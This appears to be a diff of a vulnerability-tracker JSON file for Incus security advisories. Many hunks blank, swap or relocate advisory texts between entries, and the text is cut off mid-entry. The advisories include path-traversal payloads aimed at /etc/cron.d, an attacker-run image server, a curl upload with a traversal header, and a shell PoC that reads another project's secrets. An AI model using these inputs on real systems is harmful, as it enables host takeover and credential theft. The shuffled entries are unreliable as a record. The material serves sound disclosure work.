+                "description": "## Summary The fix for CVE-2026-48769 (GHSA-f6m5-xw2g-xc4x, commit `46d6ef23`, present in v7.2.0) added `validate.IsSHA256(fp)` but gated it to `protocol == 'direct'` only. A project user with `EntitlementCanCreateImages` can `POST /1.0/images` with `source.protocol=simplestreams` (or `incus`/`lxd`/`oci`), `source.secret=<any>`, and `source.fingerprint=../../../../etc/cron.d/x`. Because the secret path skips the fingerprint reassignment, the raw attacker value reaches `os.Create` at `daemon_images.go:393` as the root daemon \u2014 an unconditional arbitrary file create/truncate; pairing with an attacker-run `source.server` fills it with attacker content \u2192 host RCE. ## Root Cause `imgPostRemoteInfo` (`images.go:532`) maps the request body `Fingerprint`\u2192`Alias`, plus `Protocol`, `Secret`, `Server`. `fp := args.Alias` (`daemon_images.go:93`) is the attacker fingerprint. The block at `daemon_images.go:135-161` that would reassign `fp = info.Fingerprint` is gated by `if args.Secret == ''` \u2014 so with a secret set it is skipped and `fp` stays the raw traversal string. The validation `if protocol == 'direct' { validate.IsSHA256(fp) }` (`daemon_images.go:350`) does not run for `simplestreams`/`incus`/`lxd`/`oci`. `destName := filepath.Join(destDir, fp)` (`:358`) then, in the `{incus,lxd,oci,simplestreams}` branch, `dest, _ := os.Create(destName)` (`:393`) \u2014 executing BEFORE the `fp = info.Fingerprint` reassignment at `:416`. `GetPrivateImageFile(fp, secret, request)` streams the attacker server's bytes into the created file. ## Impact Unconditional arbitrary-file create/truncate on any root-writable host path (integrity/DoS); with a malicious `source.server`, arbitrary-content write \u2192 host root RCE (e.g. `/etc/cron.d/`). The failure-path `os.Remove(destName)` also gives an arbitrary-path unlink primitive. ## Proof of Concept As a project user with `EntitlementCanCreateImages`: `POST /1.0/images` with body `source.type=image`, `source.protocol=simplestreams`, `source.server=http://attacker`, `source.secret=x`, `source.fingerprint=../../../../etc/cron.d/x`. Incus creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x` and streams the attacker server's content into it. ## Attack Chain 1. Entry: `POST /1.0/images` (auth `EntitlementCanCreateImages`, images.go:1159) \u2192 `imgPostRemoteInfo` (images.go:532) maps body into `imageDownloadArgs`. 2. fp init: `fp := args.Alias` = attacker fingerprint (daemon_images.go:93). 3. Alias resolution skipped: the `fp = info.Fingerprint` reassignment (daemon_images.go:135-161) is gated by `if args.Secret == ''`; with a secret set it is skipped \u2192 `fp` stays the raw traversal string. 4. Check: `if protocol == 'direct' { validate.IsSHA256(fp) }` (daemon_images.go:350) \u2014 does NOT run for simplestreams/incus/lxd/oci. Bypass proof: `git show 46d6ef23` adds exactly `if protocol == 'direct' { ... IsSHA256 ... }`; no validation for other protocols. 5. Sink: `destName := filepath.Join(VarPath('images'), fp)` (:358) \u2192 `dest, _ := os.Create(destName)` (:393) executes before `fp = info.Fingerprint` (:416). Root daemon creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x`. `GetPrivateImageFile(fp, secret, request)` (:452) streams attacker bytes. 6. Impact: arbitrary-file truncate on any root-writable path; malicious `source.server` \u2192 arbitrary-content write \u2192 host RCE. ## Bypass Evidence `git show 46d6ef23` confirms the fix gates `validate.IsSHA256(fp)` behind `protocol == 'direct'` only. `grep -n` confirms `args.Secret == ''` at :135 gating the reassignment at :160, and `os.Create(destName)` at :393 preceding the reassignment at :416. Incomplete-fix bypass \u2014 affected range is the CVE-2026-48769 fix version onward through HEAD. ## Affected Versions `<= 7.2.0` (fix commit 46d6ef23 IS contained in v7.2.0, so the bypass affects the released version; vulnerable code verified present on HEAD 60d85b3e). ## Suggested Fix Hoist `validate.IsSHA256(fp)` to run for ALL protocols before `filepath.Join`/`os.Create`, and re-validate after any `fp = info.Fingerprint` reassignment. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1429,8 +1429,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1455,19 +1455,6 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
-                "severity": "HIGH",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "CVE-2026-81498": {
-                "cve_id": "CVE-2026-81498",
                 "title": "security update",
                 "description": "security update",
                 "severity": "HIGH",
@@ -1479,10 +1466,23 @@
                     }
                 ]
             },
+            "CVE-2026-81498": {
+                "cve_id": "CVE-2026-81498",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -1520,8 +1520,8 @@
             },
             "GHSA-443p-7392-h4v2": {
                 "cve_id": "GHSA-443p-7392-h4v2",
-                "title": "Restricted project can use pull mode migration through clustered refresh",
-                "description": "### Summary Restricted projects aren't allowed to use pull mode migration, as that has the server connect to an arbitrary remote URL chosen by the user. That rule is enforced by the instance creation check, but on clustered servers a migration request with `refresh` set for an instance that already exists locally takes a short-circuit straight into the migration sink and never runs that check. ### Impact A user with instance creation rights in a restricted project on a clustered server can have the server open an outbound TLS websocket connection to a URL of their choice, trusting a certificate they supply. This can be used to probe services reachable from the server. The refresh only synchronizes storage for an instance the user already owns, so no configuration bypass results from it. Standalone servers are not affected. ### Details The pull mode restriction is now enforced at the start of the refresh short-circuit, before the request is forwarded to another member or the migration sink is set up. ### Workarounds Don't grant instance creation in restricted projects on clustered servers to users who shouldn't be able to initiate outbound connections from the server.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -1533,19 +1533,6 @@
             },
             "GHSA-579w-c4rw-c8q3": {
                 "cve_id": "GHSA-579w-c4rw-c8q3",
-                "title": "Arbitrary file write on host via symlink in migration stream",
-                "description": "### Summary When receiving an instance or custom storage volume through migration (copy, move, refresh, push or pull), Incus hands the incoming data stream to `rsync`, or to `btrfs receive` for optimized transfers between btrfs pools. Both tools replay the stream on the host using regular path-based system calls and follow symlinks in the paths they write to. A malicious migration source can plant a symlink in the transferred volume, such as `rootfs` pointing at `/`, and have later entries in the same stream (or in the following snapshot or main volume stream) written through it. The symlink check added in Incus 7.3 runs after the transfer, so it doesn't prevent those writes. ### Impact Any client allowed to create an instance or custom volume in a project, or any server a target is told to copy or move from, can write attacker-controlled files to arbitrary paths on the target host as root, leading to full host compromise. For virtual machines the same technique can replace the `root.img` block file with a symlink before the block stream is written through it. All storage drivers receiving through `rsync` are affected, as is the optimized btrfs path. Optimized ZFS transfers are not affected as `zfs receive` never resolves host paths. Releases before 7.3.0 are additionally affected by a `rootfs` symlink surviving the transfer, which the file API then follows when chrooting into the container, allowing host files to be read as well as written. ### Details `rsync` writes each received entry to `<volume>/<path>` and, when the sender marks the parent directories as not transferred, resolves that path through whatever already exists on the receiving side, including a symlink created earlier in the transfer. `btrfs receive` behaves the same way as it applies `mkfile`, `write`, `mkdir` and `rename` commands with plain `creat()`, `open()`, `mkdir()` and `rename()` calls on paths built from the received subvolume. Neither verifies the stream against the real filesystem it was supposed to describe, so a crafted stream isn't constrained to what a genuine sender would produce. ### Workarounds Only allow trusted clients to create instances and custom volumes, and only migrate from trusted servers.",
-                "severity": "CRITICAL",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "GHSA-hpjh-q53p-f27r": {
-                "cve_id": "GHSA-hpjh-q53p-f27r",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -1557,10 +1544,23 @@
                     }
                 ]
             },
+            "GHSA-hpjh-q53p-f27r": {
+                "cve_id": "GHSA-hpjh-q53p-f27r",
+                "title": "Arbitrary file write on host via path traversal in instance backup dependent volumes",
+                "description": "### Summary Importing an instance backup validates the instance name and snapshot names, but not the names of the dependent custom volumes listed in the backup's `index.yaml`. Those names are used verbatim as path segments when creating the volume on the target storage pool, so a `../` chain escapes the storage pool directory. ### Impact Any client allowed to create instances in a project can have the Incus daemon create root-owned directories, populated with attacker-controlled content, at arbitrary paths on the host, leading to full host compromise. The backup also names the project each dependent volume is created in, so the same request could create custom volumes in projects the caller has no access to. ### Details The fixes for CVE-2026-81495 and CVE-2026-81496 added name validation to the direct custom volume and instance backup import handlers. The dependent volume path nested inside an instance backup reaches the same volume creation code without going through either check. The name flows through `filepath.Join`, which collapses `../`, into `os.Mkdir` and the subsequent unpacking of the volume data. The attached-device gate can be satisfied by splitting the traversal string across the device's `pool` and `source` fields, as only the pool of the volume entry is resolved against a real storage pool. ### Workarounds Only allow trusted clients to create instances.",
+                "severity": "CRITICAL",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Project restriction bypass for custom volume copy with omitted source type",
-                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1572,8 +1572,8 @@
             },
             "GHSA-mfwv-x733-9446": {
                 "cve_id": "GHSA-mfwv-x733-9446",
-                "title": "Authorization bypass lets a restricted client read any operation in another project",
-                "description": "### Summary **Broken Authorization (CWE-862, Missing Authorization) on `GET /1.0/operations/{uuid}`.** The handler performs no authorization of any kind. Any authenticated client \u2014 including a TLS client certificate restricted to a single project \u2014 can read the full contents of any in-flight operation in any other project, including the command line, the environment variables and the websocket secrets the operation carries. `operationGet` is registered under `allowAuthenticated`, which your own code documents as deferring the real decision to the handler. The handler never makes one. ### Affected | Line | Range | Verified | |---|---|---| | Feature | `>= v0.2.0`, through `v7.4.0` | runtime, 7.4.0 from your apt repository | | LTS 6.0 | `v6.0.0` \u2013 `v6.0.6`, `stable-6.0` HEAD | runtime, 6.0.6 from your apt repository | | 7.0 | `v7.0.0`, `v7.0.1`, `stable-7.0` HEAD | source | | main | `dd19d9938` | source | The check has never existed. `operationGet` is 53 lines with zero authorizer calls at every tag from `v6.0.0` to `v7.4.0` and on all three branch heads. `v0.2.0` is the first release containing `613f937dc`, which is where operations authorization was introduced \u2014 so it is the first release in which Incus claims to authorize operations and does not authorize this one. One question on the range rather than an assertion: `doc/support.md` still describes 6.x as the feature line and refers to a future 7.0 LTS, while `stable-7.0` already carries point releases. Please confirm whether 7.0 is a supported line before the advisory range is published. ### Contrast, on one URL, one certificate, one instant A client certificate restricted to project `attacker`. A container `victim-box` in project `victim`. An admin starts an `exec` in `victim` carrying a marker in its environment. Then, as the restricted certificate: ``` --- attacker GET /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 200 --- attacker GET .../wait?timeout=1 -> 200 --- attacker DELETE /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 403 --- DELETE error body: {'error_code':403,'error':'User does not have permission for project \\'victim\\''} --- contents returned by the GET that was allowed, after the DELETE was denied: {'instances':['/1.0/instances/victim-box?project=victim']} {'DB_PASSWORD':'s3cr3t-victim-value','HOME':'/root','LANG':'C.UTF-8','USER':'root','PATH':'...'} {'0':'c5c793028efb9e0691423dfcd2a36e6dc18031b1408211ed8aa80308a7aef2a1', '1':'e557d78cd9a22790759e6997f1fdcdb9a5f22c41d811e588a3d96ea9021fffd7', '2':'edf04a0ae7d90ed45e31b322d9be311dfaef2683e5be6676bc07bab34c0caf34', 'control':'afa5bb2ed82f416c563d6f8881a4f5a01c3d66ad14ca3b5ce3f7c90e50c4d85b'} ``` `DELETE` refuses by project. `GET` on the same URL, from the same certificate, in the same second, hands over the victim's command line, environment and websocket secrets. ### Root cause `cmd/incusd/operations.go` registers three actions under `allowAuthenticated`: ```go 33: Delete: APIEndpointAction{Handler: operationDelete, AccessHandler: allowAuthenticated}, 34: Get: APIEndpointAction{Handler: operationGet, AccessHandler: allowAuthenticated}, 40: Get: APIEndpointAction{Handler: operationsGet, AccessHandler: allowAuthenticated}, ``` `cmd/incusd/daemon.go:275` states the contract: > `allowAuthenticated` is an AccessHandler which allows only authenticated requests. This should be used in conjunction with **further access control within the handler** (e.g. to filter resources the user is able to view/edit). Two of the three do that. `operationDelete` resolves the project from `op.Project()`, reads `op.Permission()`, builds an `auth.NewObject` per resource and calls `s.Authorizer.CheckPermission` (`operations.go:280-306`). `operationsGet` takes a `GetPermissionChecker` for `auth.EntitlementCanViewOperations` and filters every local and remote operation through it (`operations.go:538`, `:556`, `:584`). `operationGet` (`operations.go:181`) resolves the operation out of the global UUID-keyed map and renders it: ```go op, err := operations.OperationGetInternal(id) if err == nil { _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` No `op.Project()`, no `op.Permission()`, no authorizer call, no read of `?project=`. The map is global, so the UUID alone selects the object. This is not a regression. `git log -S` puts it at the commit that introduced operations authorization: `613f937dc`, 2023-10-25, *'lxd: Update authorization for operations'* \u2014 a single-file, 34-line diff with four hunks. One hunk adds the check to `operationDelete`; three add the checker and its two filter sites to `operationsGet`. `operationGet` sits 77 lines above the `operationDelete` hunk **in that same diff** and is not touched. The list and the destructive verb were authorized; the read was walked past. ### Impact A tenant holding a restricted certificate \u2014 the mechanism Incus ships specifically to confine a client to its own projects \u2014 reads, from any other project on the server: - the full command line of any running `exec`, including anything passed as an argument; - the complete environment of that command, which is where deployment tooling puts database passwords, API tokens and cloud credentials; - the `fds` secrets for the operation's websockets, and the operation's resource URLs, which name instances and volumes in the other project. **Escalation to full server admin, demonstrated.** `incus config trust add` creates a `Running` operation whose metadata *is* the enrolment token. Reading that operation yields the token; the token enrols a fresh, unrestricted client certificate. From the restricted certificate we read such an operation, reassembled the token, enrolled a new certificate, and then read the victim's instance (HTTP 200) and listed every project on the server. We are **not** pricing that chain into the score below, because it needs a trust-token operation to be pending at the moment of the read, and that is operator timing rather than code. It is reported because it bounds what the primitive is worth, not because we are claiming it. **Limitation, stated plainly.** The attacker must know the operation's UUID and cannot get it from Incus. `uuid.New()` (`internal/server/operations/operations.go:138`) is `crypto/rand`-backed UUIDv4, 122 bits. We verified that a restricted certificate sees nothing through any enumeration path: `/1.0/operations?project=attacker`, `?all-projects=true` and `?project=victim` all return empty, and the victim's instance is correctly refused with 403. The UUID must come from outside \u2014 an operator's shell history or CI log, the `Location` header of an async response passing through a proxy or APM trace, `incus monitor` output pasted into a ticket, a former project membership, or a co-tenant on a shared automation account. No victim interaction is required after that. This is the same gating you accepted in CVE-2026-81501, whose text reads: *'the 64-hex fingerprint is not returned by GET / list to a caller without CanView. The attacker must obtain it out of band (logs, backups, a former project membership, a predictable custom image, etc.). No victim interaction is required after that.'* ### Suggested fix Give `operationGet` the check `operationDelete` already performs. The finished handler, with the existing body unchanged below it: ```go func operationGet(d *Daemon, r *http.Request) response.Response { s := d.State() id, err := pathVar(r, 'id') if err != nil { return response.SmartError(err) } var body *api.Operation // First check if the query is for a local operation from this node op, err := operations.OperationGetInternal(id) if err == nil { projectName := op.Project() if projectName == '' { projectName = api.ProjectDefaultName } err = s.Authorizer.CheckPermission(r.Context(), r, auth.ObjectProject(projectName), auth.EntitlementCanViewOperations) if err != nil { return response.SmartError(err) } _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` `CanViewOperations` is the entitlement `operationsGet` already uses for exactly this question, so the read path and the list path end up answering it the same way. Using `op.Permission()` as `operationDelete` does would also work and would be stricter; `CanViewOperations` is suggested because it matches the verb. The cluster-forwarding branch below it inherits the fix for free: the remote member runs `operationGet` too and will apply the same check to the forwarded identity. `operationWaitGet` (`operations.go:46`) is registered `AllowUntrusted: true` and returns the same rendered object on completion. It needs the same treatment or the fix is bypassable by waiting instead of getting. We have not tested that path against a fix and are flagging it rather than asserting it. ### Dedup We could find no published advisory of yours covering operations. The fourteen published between 2026-07-30 and 2026-08-27 are image import, backup import, volume import, cross-project instance copy, migration config override, network address sets, idmap isolation, nvidia capabilities, VM template paths, image symlinks and fingerprints, and a CLI traversal. If this duplicates something already in your queue, please say so and close it \u2014 we would rather know than have you carry two. ### PoC Full sequence, reproducible on a clean install. Run as the server admin except where marked. ```sh # --- setup, as admin ------------------------------------------------------- incus project create victim incus project create attacker incus launch images:debian/12 victim-box --project victim # a client certificate restricted to project 'attacker' incus config trust add --name attacker --restricted --projects attacker # enrol that token from the client, then confirm the restriction: incus query /1.0/certificates/<fingerprint> # { 'name': 'attacker', 'restricted': true, 'projects': [ 'attacker' ] } # --- controls: the restriction works --------------------------------------- # as the attacker certificate curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/instances/victim-box?project=victim' # 403 User does not have permission for project 'victim' for q in 'project=attacker' 'all-projects=true' 'project=victim'; do curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations?$q' done # {} {} {} the operation is invisible through every listing curl -k 'https://SERVER:8443/1.0/operations/$OPID' # no client cert # 403 # --- the finding ----------------------------------------------------------- # as admin, start a command in the victim project carrying a marker incus exec victim-box --project victim --env DB_PASSWORD=s3cr3t-victim-value -- sleep 600 & OPID=$(incus operation list --project victim --format csv | head -1 | cut -d, -f1) # as the attacker certificate, same URL, two verbs curl --cert attacker.crt --key attacker.key -k \\ -X DELETE 'https://SERVER:8443/1.0/operations/$OPID' # 403 User does not have permission for project 'victim' curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations/$OPID' # 200, and the body contains: # resources.instances -> /1.0/instances/victim-box?project=victim # metadata.environment.DB_PASSWORD -> s3cr3t-victim-value # metadata.fds -> 0, 1, 2, control ``` Verified identically on `7.4.0` and on `6.0.6`, both installed from your apt repository. Both lab containers were destroyed after the run. ### Severity `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N` \u2014 **6.3 Medium**. This is set to **parity with your own scoring of CVE-2026-81501**, which carries the identical vector, rather than argued upward. Metric by metric: - **AV:N** \u2014 the HTTPS API, reachable from wherever the client is. - **AC:H** \u2014 the 122-bit UUID must be obtained out of band. This is the metric doing the work, and it is the same one you applied to the out-of-band fingerprint in CVE-2026-81501. - **PR:L** \u2014 a valid, enrolled client certificate. Not unauthenticated: `allowAuthenticated` refuses an untrusted client on this URL, and we checked. - **UI:N** \u2014 no victim interaction once the UUID is held. - **S:C** \u2014 the vulnerable component is the API's authorization layer; the impacted component is another project, which is the isolation boundary Incus sells. - **C:H / I:N / A:N** \u2014 the endpoint is read-only. Secrets of arbitrary value are returned. If you prefer to price the demonstrated trust-token chain, the vector becomes `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` = **8.5 High**. We are not proposing it, for the reason given under Impact, but it is the honest ceiling and the decision is yours.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -1585,8 +1585,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
-                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1633,7 +1633,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1691,7 +1691,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1710,7 +1710,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1729,7 +1729,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1748,7 +1748,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1767,7 +1767,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1786,7 +1786,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1805,7 +1805,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1824,7 +1824,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -2214,8 +2214,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary file write on host via image fingerprint path traversal",
+                "description": "## Summary The fix for CVE-2026-48769 (GHSA-f6m5-xw2g-xc4x, commit `46d6ef23`, present in v7.2.0) added `validate.IsSHA256(fp)` but gated it to `protocol == 'direct'` only. A project user with `EntitlementCanCreateImages` can `POST /1.0/images` with `source.protocol=simplestreams` (or `incus`/`lxd`/`oci`), `source.secret=<any>`, and `source.fingerprint=../../../../etc/cron.d/x`. Because the secret path skips the fingerprint reassignment, the raw attacker value reaches `os.Create` at `daemon_images.go:393` as the root daemon \u2014 an unconditional arbitrary file create/truncate; pairing with an attacker-run `source.server` fills it with attacker content \u2192 host RCE. ## Root Cause `imgPostRemoteInfo` (`images.go:532`) maps the request body `Fingerprint`\u2192`Alias`, plus `Protocol`, `Secret`, `Server`. `fp := args.Alias` (`daemon_images.go:93`) is the attacker fingerprint. The block at `daemon_images.go:135-161` that would reassign `fp = info.Fingerprint` is gated by `if args.Secret == ''` \u2014 so with a secret set it is skipped and `fp` stays the raw traversal string. The validation `if protocol == 'direct' { validate.IsSHA256(fp) }` (`daemon_images.go:350`) does not run for `simplestreams`/`incus`/`lxd`/`oci`. `destName := filepath.Join(destDir, fp)` (`:358`) then, in the `{incus,lxd,oci,simplestreams}` branch, `dest, _ := os.Create(destName)` (`:393`) \u2014 executing BEFORE the `fp = info.Fingerprint` reassignment at `:416`. `GetPrivateImageFile(fp, secret, request)` streams the attacker server's bytes into the created file. ## Impact Unconditional arbitrary-file create/truncate on any root-writable host path (integrity/DoS); with a malicious `source.server`, arbitrary-content write \u2192 host root RCE (e.g. `/etc/cron.d/`). The failure-path `os.Remove(destName)` also gives an arbitrary-path unlink primitive. ## Proof of Concept As a project user with `EntitlementCanCreateImages`: `POST /1.0/images` with body `source.type=image`, `source.protocol=simplestreams`, `source.server=http://attacker`, `source.secret=x`, `source.fingerprint=../../../../etc/cron.d/x`. Incus creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x` and streams the attacker server's content into it. ## Attack Chain 1. Entry: `POST /1.0/images` (auth `EntitlementCanCreateImages`, images.go:1159) \u2192 `imgPostRemoteInfo` (images.go:532) maps body into `imageDownloadArgs`. 2. fp init: `fp := args.Alias` = attacker fingerprint (daemon_images.go:93). 3. Alias resolution skipped: the `fp = info.Fingerprint` reassignment (daemon_images.go:135-161) is gated by `if args.Secret == ''`; with a secret set it is skipped \u2192 `fp` stays the raw traversal string. 4. Check: `if protocol == 'direct' { validate.IsSHA256(fp) }` (daemon_images.go:350) \u2014 does NOT run for simplestreams/incus/lxd/oci. Bypass proof: `git show 46d6ef23` adds exactly `if protocol == 'direct' { ... IsSHA256 ... }`; no validation for other protocols. 5. Sink: `destName := 